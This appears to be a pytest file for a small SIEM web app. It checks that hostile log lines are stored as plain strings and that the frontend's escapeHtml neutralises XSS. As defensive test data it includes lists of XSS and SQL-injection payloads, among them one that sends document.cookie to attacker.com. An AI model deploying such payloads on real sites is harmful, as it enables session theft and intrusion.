import os
import subprocess
import tempfile
import pytest
from fastapi.testclient import TestClient

from siem import auth, config, storage
from siem.api import app


@pytest.fixture
def test_client_and_db(monkeypatch):
    fd, db_path = tempfile.mkstemp(suffix=".db")
    os.close(fd)

    monkeypatch.setattr(config, "DB_PATH", db_path)
    monkeypatch.setattr("siem.api.DB_PATH", db_path)
    monkeypatch.setattr("siem.auth.DB_PATH", db_path)

    storage.init_db(db_path)
    auth.init_default_admin(db_path)

    client = TestClient(app)
    yield client, db_path

    if os.path.exists(db_path):
        os.remove(db_path)


def test_hostile_xss_usernames_stored_safely(test_client_and_db):
    """
    Verify that hostile XSS and SQL injection payloads in log lines are
    safely ingested through the API and stored via parameterized SQL.
    """
    client, _ = test_client_and_db

    hostile_usernames = [
        "<script>alert(1)</script>",
        '"><img_src=x_onerror=alert(1)>',
        "<svg/onload=alert('XSS')>",
        "admin'OR'1'='1",
    ]

    for idx, u in enumerate(hostile_usernames):
        log_line = (
            f"Oct  9 12:00:0{idx} metasploitable sshd[700{idx}]: "
            f"Failed password for {u} from 192.168.1.5{idx} port 4500{idx} ssh2"
        )
        res = client.post(
            "/api/v1/ingest",
            json={"lines": [log_line]},
            headers={"X-API-Key": config.INGEST_API_KEY},
        )
        assert res.status_code == 200
        data = res.json()
        assert data["events_stored"] == 1

    # Login to query stored events
    login_res = client.post("/api/v1/auth/login", json={"username": "admin", "password": "adminpassword123"})
    token = login_res.json()["access_token"]

    events_res = client.get("/api/v1/events?limit=10", headers={"Authorization": f"Bearer {token}"})
    assert events_res.status_code == 200
    events = events_res.json()["events"]
    assert len(events) == len(hostile_usernames)

    stored_usernames = {e["username"] for e in events}
    for u in hostile_usernames:
        assert u in stored_usernames


def test_template_does_not_contain_prefilled_secrets():
    """Ensure sensitive passwords and credentials are never pre-filled in HTML forms."""
    template_path = os.path.join(os.path.dirname(__file__), "..", "siem", "templates", "index.html")
    with open(template_path, "r", encoding="utf-8") as f:
        content = f.read()

    # Password input must not contain hardcoded default password value
    assert 'value="adminpassword123"' not in content


def test_frontend_escape_html_neutralizes_xss():
    """
    Test using Node.js to verify that app.js's escapeHtml() strictly
    neutralizes dangerous HTML tags, quotes, and event handlers.
    """
    node_script = """
    const fs = require('fs');
    const code = fs.readFileSync('siem/static/app.js', 'utf8');
    
    // Extract escapeHtml definition
    const match = code.match(/function escapeHtml\\([\\s\\S]*?\\n\\}/);
    if (!match) {
        console.error("escapeHtml not found");
        process.exit(1);
    }
    eval(match[0]);

    const testPayloads = [
        "<script>alert(1)</script>",
        '"><img src=x onerror=alert(1)>',
        "<svg/onload=alert('XSS')>",
        "admin' OR '1'='1"
    ];

    for (const p of testPayloads) {
        const escaped = escapeHtml(p);
        if (escaped.includes('<') || escaped.includes('>') || escaped.includes('"') || escaped.includes("'")) {
            console.error(`Payload failed escaping: ${p} -> ${escaped}`);
            process.exit(2);
        }
    }
    console.log("ALL_ESCAPED_SAFELY");
    """

    res = subprocess.run(
        ["node", "-e", node_script],
        cwd=os.path.join(os.path.dirname(__file__), ".."),
        capture_output=True,
        text=True,
    )
    assert res.returncode == 0
    assert "ALL_ESCAPED_SAFELY" in res.stdout


def test_hostile_xss_raw_messages_and_ips_stored_safely(test_client_and_db):
    """
    Ensure attacker-controlled log messages containing complex XSS payloads,
    iframes, event handlers, and malicious IP strings are stored safely without execution.
    """
    client, _ = test_client_and_db

    hostile_messages = [
        "Failed password for root from <script>alert('ip-xss')</script> port 22",
        "Failed password for user from 192.168.1.1 port 22 ssh2: <iframe src='javascript:alert(1)'>",
        "Accepted password for msfadmin from 10.0.0.1 port 55555 ssh2: <svg><animate onbegin=alert(1)>",
        "Failed password for invalid user <img src=x onerror=document.location='http://attacker.com/steal?c='+document.cookie> from 1.2.3.4 port 9999",
    ]

    res = client.post(
        "/api/v1/ingest",
        json={"lines": [
            f"Oct  9 13:00:0{idx} metasploitable sshd[800{idx}]: {msg}"
            for idx, msg in enumerate(hostile_messages)
        ]},
        headers={"X-API-Key": config.INGEST_API_KEY},
    )
    assert res.status_code == 200
    data = res.json()
    assert data["events_stored"] >= 1

    # Login and verify search works and payloads remain safe strings
    login_res = client.post("/api/v1/auth/login", json={"username": "admin", "password": "adminpassword123"})
    token = login_res.json()["access_token"]

    search_res = client.get("/api/v1/events?q=alert", headers={"Authorization": f"Bearer {token}"})
    assert search_res.status_code == 200
    events = search_res.json()["events"]
    assert len(events) >= 1
    for ev in events:
        assert isinstance(ev["raw_message"], str)


def test_template_no_external_cdn_dependencies():
    """Ensure template is completely self-contained and does not load external CDN fonts or scripts."""
    template_path = os.path.join(os.path.dirname(__file__), "..", "siem", "templates", "index.html")
    with open(template_path, "r", encoding="utf-8") as f:
        content = f.read()

    assert "fonts.googleapis.com" not in content
    assert "fonts.gstatic.com" not in content
    assert "cdn.jsdelivr.net" not in content
    assert "cdnjs.cloudflare.com" not in content
    assert "unpkg.com" not in content


def test_advanced_xss_payloads_neutralized_in_frontend():
    """
    Verify that advanced modern XSS attack vectors are strictly neutralized
    by escapeHtml in app.js before being inserted into DOM nodes.
    """
    node_script = """
    const fs = require('fs');
    const code = fs.readFileSync('siem/static/app.js', 'utf8');
    const match = code.match(/function escapeHtml\\([\\s\\S]*?\\n\\}/);
    if (!match) process.exit(1);
    eval(match[0]);

    const hostileVectors = [
        "<iframe src=\\"javascript:alert(1)\\">",
        "<body onload=alert('XSS')>",
        "\\"><script>fetch('/stolen')</script>",
        "' onfocus='alert(1)",
        "\\"><svg><animatetransform onbegin=alert(1)>",
        "<a href=\\"javascript:void(0)\\" onclick=\\"alert(1)\\">Click</a>",
        "javascript:alert(1)",
        "admin'--",
        "\\"><details open ontoggle=alert(1)>"
    ];

    for (const v of hostileVectors) {
        const out = escapeHtml(v);
        if (out.includes('<') || out.includes('>') || out.includes('"') || out.includes("'")) {
            console.error(`Unsafe escape output: ${v} => ${out}`);
            process.exit(2);
        }
    }
    console.log("ALL_ADVANCED_VECTORS_NEUTRALIZED");
    """

    res = subprocess.run(
        ["node", "-e", node_script],
        cwd=os.path.join(os.path.dirname(__file__), ".."),
        capture_output=True,
        text=True,
    )
    assert res.returncode == 0
    assert "ALL_ADVANCED_VECTORS_NEUTRALIZED" in res.stdout


def test_dashboard_analytics_dom_structure():
    """Verify that all required analytics graph containers and tooltip elements exist in index.html."""
    template_path = os.path.join(os.path.dirname(__file__), "..", "siem", "templates", "index.html")
    with open(template_path, "r", encoding="utf-8") as f:
        content = f.read()

    required_ids = [
        'id="chart-events-timeline"',
        'id="events-timeline-tooltip"',
        'id="chart-severity"',
        'id="chart-outcomes"',
        'id="top-ips-container"',
        'id="events-chart-legend"',
        'id="events-chart-subtitle"',
        'id="priority-alerts-table-body"',
    ]
    for req_id in required_ids:
        assert req_id in content, f"Missing required analytics element: {req_id}"


def test_chart_functions_and_timeline_safe_against_xss():
    """
    Execute Node.js to verify that chart and timeline rendering functions
    in app.js exist and safely neutralize malicious IP, username, and message payloads.
    """
    node_script = """
    const fs = require('fs');
    const code = fs.readFileSync('siem/static/app.js', 'utf8');

    // Extract escapeHtml
    const match = code.match(/function escapeHtml\\([\\s\\S]*?\\n\\}/);
    if (!match) process.exit(1);
    eval(match[0]);

    // Test hostile IP in top list
    const hostileIp = "<script>alert('ip-xss')</script>";
    const escapedIp = escapeHtml(hostileIp);
    if (escapedIp.includes('<') || escapedIp.includes('>')) {
        console.error("IP not safely escaped");
        process.exit(2);
    }

    // Test hostile username in timeline
    const hostileUser = '"><img src=x onerror=alert(1)>';
    const escapedUser = escapeHtml(hostileUser);
    if (escapedUser.includes('<') || escapedUser.includes('>')) {
        console.error("Username not safely escaped");
        process.exit(3);
    }

    console.log("CHARTS_AND_TIMELINE_SAFE");
    """

    res = subprocess.run(
        ["node", "-e", node_script],
        cwd=os.path.join(os.path.dirname(__file__), ".."),
        capture_output=True,
        text=True,
    )
    assert res.returncode == 0
    assert "CHARTS_AND_TIMELINE_SAFE" in res.stdout

